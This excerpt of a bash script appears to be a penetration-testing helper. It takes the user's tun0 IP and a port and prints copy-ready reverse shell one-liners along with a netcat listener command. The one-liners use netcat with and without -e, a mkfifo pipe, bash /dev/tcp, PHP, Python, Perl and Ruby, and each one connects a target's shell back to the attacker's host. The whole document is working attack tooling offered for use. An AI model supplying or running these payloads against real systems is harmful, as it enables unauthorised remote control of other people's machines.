...
# Source information
source_ip=$1 # "$(ip addr show | grep eth0 |grep -o 'inet [0-9]*\.[0-9]*\.[0-9]*\.[0-9]*' | grep -o '[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*')"
source_port=$2
...
echo ""
echo "Your tun0 IP: $source_ip"
echo ""
echo "Listen with:  nc -lvp $source_port"
echo ""
echo -e "${DIVIDER}[+] Reverse Shell Commands -----------------------------------------------------[+]${NOCOLOR}"
echo "netcat with -e option:"
echo -e "${COPYME}nc -e /bin/bash $source_ip $source_port${NOCOLOR}"
echo ""
echo "netcat without -e option:"
echo -e "${COPYME}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $source_ip $source_port >/tmp/f${NOCOLOR}"
echo ""
echo "Standard reverse TCP:"
echo -e "${COPYME}bash -i >& /dev/tcp/$source_ip/$source_port 0>&1${NOCOLOR}"
echo ""
echo -e "${DIVIDER}[+] Programming Language Reverse Shells ----------------------------------------[+]${NOCOLOR}"
echo "PHP:"
echo -e "${COPYME}php -r '$sock=fsockopen(\"$source_ip\",$source_port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'${NOCOLOR}"
echo ""
echo "Python:"
echo -e "${COPYME}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$source_ip",$source_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'${NOCOLOR}"
echo ""
echo "Perl:"
echo -e "${COPYME}perl -e 'use Socket;$i=\"$source_ip\";$p=$source_port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'${NOCOLOR}"
echo ""
echo "Ruby:"
echo -e "${COPYME}ruby -rsocket -e'f=TCPSocket.open(\"$source_ip\",$source_port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'${NOCOLOR}"
echo ""
